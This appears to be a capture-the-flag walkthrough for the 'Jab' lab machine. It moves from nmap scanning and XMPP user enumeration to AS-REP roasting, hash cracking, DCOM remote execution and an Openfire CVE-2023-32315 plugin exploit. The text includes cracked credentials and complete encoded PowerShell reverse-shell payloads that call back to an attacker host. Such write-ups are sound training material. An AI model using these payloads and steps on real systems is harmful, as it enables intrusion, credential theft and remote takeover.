# Jab

***
***


Running our nmap scan as usual we have -:


```bash
# Nmap 7.94SVN scan initiated Mon Feb 26 13:40:22 2024 as: nmap -p53,88,135,139,389,445,593,636,3269,5222,5223,5262,5263,5269,5276,5985,7070,7443,7777,49664,49665,49666,49671,49686,49687,49688,49703,49764,61394 -T4 -v --min-rate=1000 -sCV -oN nmap.txt 10.129.96.241
Increasing send delay for 10.129.96.241 from 0 to 5 due to 11 out of 23 dropped probes since last increase.
Nmap scan report for 10.129.96.241
Host is up (0.19s latency).

PORT      STATE    SERVICE             VERSION
53/tcp    open     domain              Simple DNS Plus
88/tcp    filtered kerberos-sec
135/tcp   open     msrpc               Microsoft Windows RPC
139/tcp   open     netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open     ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-26T12:41:59+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb

--SNIP--

445/tcp   open     microsoft-ds?
593/tcp   open     ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA
 
 --SNIP-- 
 
|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
|_ssl-date: 2024-02-26T12:41:59+00:00; 0s from scanner time.
3269/tcp  filtered globalcatLDAPssl
5222/tcp  open     jabber
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb

--SNIP--

5223/tcp  filtered hpvirtgrp
5262/tcp  open     jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     xmpp: 
|       version: 1.0
|     unknown: 
|     capabilities: 
|     stream_id: 3aoxgujk9o
|_    features: 
5263/tcp  filtered unknown
5269/tcp  open     xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       (timeout)
|     xmpp: 
|     unknown: 
|     compression_methods: 
|     auth_mechanisms: 
|_    features: 
5276/tcp  open     ssl/jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       (timeout)
|     xmpp: 
|     unknown: 
|     compression_methods: 
|     auth_mechanisms: 
|_    features: 
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb

--SNIP-- 

5985/tcp  filtered wsman
7070/tcp  open     realserver?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>

--SNIP--

7443/tcp  open     ssl/oracleas-https?
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb

--SNIP--

|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7777/tcp  open     socks5              (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
49664/tcp open     msrpc               Microsoft Windows RPC
49665/tcp open     msrpc               Microsoft Windows RPC
49666/tcp open     msrpc               Microsoft Windows RPC
49671/tcp open     msrpc               Microsoft Windows RPC
49686/tcp open     ncacn_http          Microsoft Windows RPC over HTTP 1.0
49687/tcp open     msrpc               Microsoft Windows RPC
49688/tcp open     msrpc               Microsoft Windows RPC
49703/tcp open     msrpc               Microsoft Windows RPC
49764/tcp open     msrpc               Microsoft Windows RPC
61394/tcp filtered unknown
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.94SVN%I=7%D=2/26%Time=65DC86D8%P=x86_64-pc-linux-gnu%r
SF:(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.or
SF:g/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-str
SF:eams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5276-TCP:V=7.94SVN%T=SSL%I=7%D=2/26%Time=65DC86F2%P=x86_64-pc-linux
SF:-gnu%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabb
SF:er\.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xm
SF:pp-streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7070-TCP:V=7.94SVN%I=7%D=2/26%Time=65DC86C3%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2026\x20Feb\x
SF:202024\x2012:40:35\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x20202
SF:2\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x2

--SNIP--

Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-26T12:41:51
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 26 13:42:10 2024 -- 1 IP address (1 host up) scanned in 108.35 seconds
```



- So we have `xmpp` protocol on port 5222
- Using this [article](https://kernal.eu/posts/xmpp-enumeration/) we can enumerate this protocol with the pidgin app

```
sudo apt update
sudo apt install pidgin
```


- Go ahead and run the below command to enable debug mode 


```
sudo pidgin -d > output.log
```


- On the next window pop-up, click **Add**, then select `XMPP` under **Protocols**.
- Input a username of your choice and type in `jab.htb` under **Domain**, Use the username as the **password** also, then make sure to check "**Create this new account on the server**"
- You should then see the **XMPP** registration page,Type in the info we used last respectively, doesn't really matter except from **username** and **password**


![](https://i.imgur.com/VIvQ8wQ.png)


- You should get the message "**Registration of whoami@jab.htb successful**", Now disable and enable the account back.
- Navigate to the **"Accounts"** tab and select your account, then you should see a drop down list, select **"Search for Users..."** 



![](https://i.imgur.com/iRt5EuX.png)


- Click **"Search Directory"** then type in (`*`) in the search bar and click **"Ok"**, you should see a list of users, Now close the app and navigate back to your terminal
- you should now see a file called `output.log`, run the below command to filter out usernames only from this file

```bash
grep -aoP '<value>\K[^<]+@jab.htb(?=</value>)' output.log | sed 's/@jab.htb//g' | sort | uniq > output_filtered.lst
```



- Then **ASREPRoast** this set of users gotten

```
impacket-GetNPUsers jab.htb/ -usersfile output_filtered.lst -outputfile outputusers.txt -dc-ip 10.129.96.241 -no-pass
```


![](https://i.imgur.com/k6JO5Fq.png)


- Then bruteforce with hashcat 


```bash
❯ hashcat -m 18200 outputusers.txt /usr/share/wordlists/rockyou.txt -O
```


![](https://i.imgur.com/uz5iVSN.png)


```
$krb5asrep$23$jmontgomery@JAB.HTB:508a9aae1345145fb9183d49b0794fd4$efdc834f7c86d1083a6adf7ed0f0bf52d9c3d06b0d42c52bddd75a0c6b06978297406907f9c6ced738452f3eba808647abda1d00e2bcf4e6a5ab058e7fee4888abd0a2c3593ed551720c79ce438b6dc0a57768c090b16c260cf2b09013c7bca0017f254fd34e5b4f9ff77b6fd5b7a95175f88cf1200a03c88aa29afc01d8e02c1e60dbf4a747815c1e6e6116a522f9375b53a4cf87e811329a4108e63193a8b5ba7acfe02895872806a828e46f72369cd521ae23d3bee8fa61a15c4c94706f3adf0848bb853c2693326062f182b99db315fb120918b85835d4c507f47aa34ccbfbe8:Midnight_121
```


- Go ahead and re-login to `pidgin` with this username and password
- Then navigate to the **"Tools"** menu and select **"XMPP Service Discovery"**

![](https://i.imgur.com/LYpzLZU.png)


- Click **"Browse"** --> **"Find Services"**
- Then select the dropdown **"conference.jab.htb"** you should see "**2003 Third...**", select it and click **"Add"**

![](https://i.imgur.com/dbcKwYc.png)


- Going back to the **"Buddy Lists"** page you should see the **"pentest2003"** room, double click to open it
- Then we have a new hash with password from an already ran hashcat output

```
$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$de17a01e2449626571bd9416dd4e3d46$4fea18693e1cb97f3e096288a76204437f115fe49b9611e339154e0effb1d0fcccfbbbb219da829b0ac70e8420f2f35a4f315c5c6f1d4ad3092e14ccd506e9a3bd3d20854ec73e62859cd68a7e6169f3c0b5ab82064b04df4ff7583ef18bbd42ac529a5747102c2924d1a76703a30908f5ad41423b2fff5e6c03d3df6c0635a41bea1aca3e15986639c758eef30b74498a184380411e207e5f3afef185eaf605f543c436cd155823b7a7870a3d5acd0b785f999facd8b7ffdafe6e0410af26efc42417d402f2819d03b3730203b59c21b0434e2e0e7a97ed09e3901f523ba52fe9d3ee7f4203de9e857761fbcb417d047765a5a01e71aff732e5d5d114f0b58a8a0df4ca7e1ff5a88c532f5cf33f2e01986ac44a353c0142b0360e1b839bb6889a54fbd9c549da23fb05193a4bfba179336e7dd69380bc4f9c3c00324e42043ee54b3017a913f84a20894e145b23b440aff9c524efb7957dee89b1e7b735db292ca5cb32cf024e9b8f5546c33caa36f5370db61a9a3facb473e741c61ec7dbee7420c188e31b0d920f06b7ffc1cb86ace5db0f9eeaf8c13bcca743b6bf8b2ece99dd58aff354f5b4a78ffcd9ad69ad8e7812a2952806feb9b411fe53774f92f9e8889380dddcb59de09320094b751a0c938ecc762cbd5d57d4e0c3d660e88545cc96e324a6fef226bc62e2bb31897670929571cd728b43647c03e44867b148428c9dc917f1dc4a0331517b65aa52221fcfe9499017ab4e6216ced3db5837d10ad0d15e07679b56c6a68a97c1e851238cef84a78754ff5c08d31895f0066b727449575a1187b19ad8604d583ae07694238bae2d4839fb20830f77fffb39f9d6a38c1c0d524130a6307125509422498f6c64adc030bfcf616c4c0d3e0fa76dcde0dfc5c94a4cb07ccf4cac941755cfdd1ed94e37d90bd1b612fee2ced175aa0e01f2919e31614f72c1ff7316be4ee71e80e0626b787c9f017504fa717b03c94f38fe9d682542d3d7edaff777a8b2d3163bc83c5143dc680c7819f405ec207b7bec51dabcec4896e110eb4ed0273dd26c82fc54bb2b5a1294cb7f3b654a13b4530bc186ff7fe3ab5a802c7c91e664144f92f438aecf9f814f73ed556dac403daaefcc7081957177d16c1087f058323f7aa3dfecfa024cc842aa3c8ef82213ad4acb89b88fc7d1f68338e8127644cfe101bf93b18ec0da457c9136e3d0efa0d094994e1591ecc4:!@#$%^&amp;*(1qazxsw
```



Using `impacket-dcomexec` designed for executing commands on remote systems using the Distributed Component Object Model (`DCOM`) protocol which allows for remote procedure calls (`RPCs`) between processes on different systems. Since we can't connect via `evil-WinRM`, this should work just fine.

Generate a reverse shell powershell base64 payload from `revshells.com` and replace here, Then start up your listener with netcat



```bash
impacket-dcomexec -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.129.97.244 'cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=' -silentcommand

# Listener

rlwrap nc -lvnp 4444
```





![](https://i.imgur.com/wlz935B.png)



## `Privilege Escalation`



Screams `Openfire-service`, 

![](https://i.imgur.com/ztpG7wg.png)



Then i decided to upload chisel and reverse port forward on port `9090` 




![](https://i.imgur.com/hNTZFtf.png)


I was then able to login to this application with user `svc_openfire` credentials


![](https://i.imgur.com/5y7JJoH.png)


Enumerating the version `4.7.5`, i saw a path trasversal vulnerability that could lead to RCE by uploading a Vulnerable Plugin.

Then downloaded this `openfire-management-tool-plugin.jar` from [here](https://github.com/miko550/CVE-2023-32315/blob/main/openfire-management-tool-plugin.jar) and uploaded it to the plugins section, note down the pass given: `123`



![](https://i.imgur.com/hLgIrcU.png)


Then navigated to **"Server"** --> "**Server Settings**" --> "**Management Tool**"


![](https://i.imgur.com/QyLII5V.png)


Enter the previous password in which we noted down into the Admin login management tool


![](https://i.imgur.com/QIsCiGw.png)


Then select "**system command**" from the drop down and we can execute commands

![](https://i.imgur.com/UODlz6V.png)



Then using the below powershell `bas64` encoded payload i was able to gain a reverse shell


```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAiACwAMQAyADMANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```



![](https://i.imgur.com/RTR5yKY.png)


Have fun 🎈
